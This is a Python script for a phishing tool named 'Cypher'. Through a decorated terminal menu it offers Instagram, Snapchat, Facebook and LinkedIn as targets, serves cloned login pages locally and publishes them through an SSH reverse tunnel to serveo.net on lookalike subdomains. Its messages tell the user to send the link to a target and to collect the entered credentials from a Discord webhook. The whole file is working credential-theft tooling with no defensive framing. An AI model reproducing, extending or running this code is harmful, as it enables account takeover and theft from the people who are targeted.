from pyfiglet import Figlet
from termcolor import colored
import colorama
import random
import os
import http.server
import socketserver
import subprocess
import webbrowser
import time
import requests
import json
import re

# Initialize colorama for Windows
colorama.init()

# Custom HTTP Handler with modified User-Agent
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def version_string(self):
        return 'CustomServer/1.0'
    
    def send_header(self, keyword, value):
        if keyword.lower() == 'server':
            # Skip the server header
            return
        http.server.SimpleHTTPRequestHandler.send_header(self, keyword, value)

def serve_website(platform):
    # Define the directory to serve based on platform
    if platform.lower() == 'instagram':
        directory = 'web/instagram'
        subdomain = f"insta-{random.randint(1000,9999)}"
    elif platform.lower() == 'snapchat':
        directory = 'web/snapchat'
        subdomain = f"snap-{random.randint(1000,9999)}"
    elif platform.lower() == 'facebook':
        directory = 'web/facebook'
        subdomain = f"fb-{random.randint(1000,9999)}"
    elif platform.lower() == 'linkedin':
        directory = 'web/linkedin'
        subdomain = f"in-{random.randint(1000,9999)}"
    else:
        print("Invalid platform selected")
        return

    # Change to the selected platform directory
    os.chdir(directory)
    
    print(f"\nStarting {platform} phishing page...")
    print("Initializing serveo.net tunnel...")
    
    try:
        # Start a simple HTTP server in the background
        PORT = random.randint(8000,9000)  # Random port to avoid conflicts
        Handler = http.server.SimpleHTTPRequestHandler
        
        try:
            httpd = socketserver.TCPServer(("", PORT), Handler)
            print(f"✓ Local server started on port {PORT}")
        except OSError as e:
            print(f"× Port {PORT} is in use, trying another port...")
            PORT = random.randint(9001,10000)
            httpd = socketserver.TCPServer(("", PORT), Handler)
            print(f"✓ Local server started on port {PORT}")
        
        # Start the server in a separate process
        import threading
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        print("\nTesting SSH connection to serveo.net...")
        test_command = "ssh -v serveo.net exit"
        test_process = subprocess.Popen(test_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        test_output, test_error = test_process.communicate()
        
        if test_process.returncode != 0:
            print("× SSH connection test failed")
            print("Detailed error:")
            print(test_error)
            print("\nTrying alternative connection method...")
            # Try alternative port
            tunnel_command = f"ssh -v -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -R {subdomain}:80:localhost:{PORT} serveo.net"
        else:
            print("✓ SSH connection test successful")
            tunnel_command = f"ssh -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -R {subdomain}:80:localhost:{PORT} serveo.net"
        
        print("\nStarting SSH tunnel...")
        if os.name == 'nt':
            process = subprocess.Popen(tunnel_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        else:
            process = subprocess.Popen(tunnel_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        
        print("Establishing secure connection...")
        time.sleep(2)
        
        # Monitor the output for the forwarding URL
        url_found = False
        error_count = 0
        while not url_found and error_count < 10:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                error = process.stderr.read()
                if error:
                    if "Permission denied" in error:
                        print("× Error: Permission denied. Try a different subdomain name.")
                    elif "Connection refused" in error:
                        print("× Error: Connection refused. Check your internet connection.")
                    elif "remote port forwarding failed" in error.lower():
                        print("× Error: Port forwarding failed. Subdomain might be in use.")
                        print("Try running the script again for a new random subdomain.")
                    else:
                        print(f"× Error: {error}")
                error_count += 1
                continue
            
            print(f"Debug: {line.strip()}")  # Debug output
            
            if "Forwarding" in line and "HTTP" in line:
                url = f"https://{subdomain}.serveo.net"
                url_found = True
                print(f"\n[+] Your phishing link is ready: {url}")
                print("[+] Send this link to your target")
                print("[+] Waiting for target to enter credentials...")
                print("[+] Check your Discord webhook for incoming credentials")
                print("\n[Press Ctrl+C to stop the server]")
                break
            
        if not url_found:
            print("\n× Failed to establish tunnel connection")
            print("\nTroubleshooting steps:")
            print("1. Check if SSH is installed and working:")
            print("   ssh -V")
            print("2. Try to establish a basic SSH connection:")
            print("   ssh -v serveo.net")
            print("3. If you get host key errors, run:")
            print("   ssh-keygen -R serveo.net")
            print("4. Make sure your internet connection is stable")
            print("5. Try running with sudo: sudo python3 main.py")
            httpd.shutdown()
            process.terminate()
            os.chdir("../../")
            return
            
        # Keep the server running until user interrupts
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping server...")
            httpd.shutdown()
            process.terminate()
            os.chdir("../../")  # Return to original directory
            
    except Exception as e:
        print(f"\n× Error: {str(e)}")
        print("\nTroubleshooting steps:")
        print("1. Make sure SSH is working:")
        print("   a) Check SSH version: ssh -V")
        print("   b) Test SSH: ssh -v serveo.net")
        print("2. If you get host key errors:")
        print("   ssh-keygen -R serveo.net")
        print("3. Install/reinstall SSH if needed:")
        print("   sudo apt update && sudo apt install openssh-client -y")
        print("4. Check your firewall settings:")
        print("   sudo ufw status")
        print("5. Try running with sudo: sudo python3 main.py")
        os.chdir("../../")  # Return to original directory

def print_menu():
    # Create a Figlet object with a different font style
    figlet = Figlet(font='slant')

    # Text to display
    text = "Cypher"

    # Generate the ASCII art
    ascii_art = figlet.renderText(text)

    # Colors for rainbow effect
    colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']

    # Get the width and height of the ASCII art
    ascii_lines = ascii_art.split('\n')
    max_width = max(len(line) for line in ascii_lines)
    height = len(ascii_lines)

    # Create decorative frame with proper width
    frame_width = max_width + 8
    frame_width = frame_width + (frame_width % 2)  # Make sure width is even
    top_border = colored('╔' + '═' * (frame_width-2) + '╗', 'cyan')
    bottom_border = colored('╚' + '═' * (frame_width-2) + '╝', 'cyan')
    empty_line = colored('║' + ' ' * (frame_width-2) + '║', 'cyan')

    # Create decorative top and bottom bars with proper width
    top_decoration = '█' + '▀' * (frame_width-4) + '█'
    bottom_decoration = '█' + '▄' * (frame_width-4) + '█'

    # Build the final output with background
    final_art = [
        top_border,
        colored('║' + top_decoration + '║', 'cyan'),
        empty_line
    ]

    # Add the rainbow text with centered alignment
    color_index = 0
    for line in ascii_lines:
        if line.strip():
            # Center the line properly
            padding = (frame_width - 2 - len(line)) // 2
            colored_line = colored(line, colors[color_index % len(colors)])
            # Ensure even padding on both sides
            right_padding = frame_width - 2 - padding - len(line)
            final_line = colored('║', 'cyan') + ' ' * padding + colored_line + ' ' * right_padding + colored('║', 'cyan')
            final_art.append(final_line)
            color_index += 1
        else:
            final_art.append(empty_line)

    # Add menu options
    menu_options = [
        "[ Select your target ]",
        "",
        "[1] Instagram",
        "[2] Snapchat",
        "[3] Facebook",
        "[4] LinkedIn",
        "[5] Exit",
        "",
        "Enter your choice: "
    ]

    # Add menu options with proper centering
    for option in menu_options[:-1]:  # Don't add the input prompt to the frame
        padding = (frame_width - 2 - len(option)) // 2
        final_line = colored('║', 'cyan') + ' ' * padding + colored(option, 'white') + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
        final_art.append(final_line)

    # Add bottom decorative elements
    final_art.extend([
        empty_line,
        colored('║' + bottom_decoration + '║', 'cyan'),
        bottom_border
    ])

    # Add matrix-style side decorations
    side_dec_left = [
        colored('░▒▓█', 'green') + ' ',
        colored('▓▒░█', 'green') + ' ',
        colored('░▒▓█', 'green') + ' '
    ]

    side_dec_right = [
        ' ' + colored('█▓▒░', 'green'),
        ' ' + colored('█░▒▓', 'green'),
        ' ' + colored('█▓▒░', 'green')
    ]

    # Print the final composition with side decorations
    for i, line in enumerate(final_art):
        if i > 0 and i < len(final_art) - 1:  # Don't add side decorations to top and bottom borders
            left_dec = side_dec_left[i % len(side_dec_left)]
            right_dec = side_dec_right[i % len(side_dec_right)]
            print(left_dec + line + right_dec)
        else:
            print(line)

    # Add bottom matrix rain effect
    matrix_bottom = ''.join(colored('▀▄'[(i+random.randint(0,1))%2], 'green') for i in range(frame_width))
    print(' ' * 4 + matrix_bottom)
    
    # Print the input prompt outside the frame
    return input(colored(menu_options[-1], 'white'))

def main():
    while True:
        choice = print_menu()
        if choice == '1':
            serve_website('instagram')
        elif choice == '2':
            serve_website('snapchat')
        elif choice == '3':
            serve_website('facebook')
        elif choice == '4':
            serve_website('linkedin')
        elif choice == '5':
            print("\nExiting...")
            break
        else:
            print("\nInvalid choice! Press Enter to continue...")
            input()
        
        # Clear screen for Windows
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main() 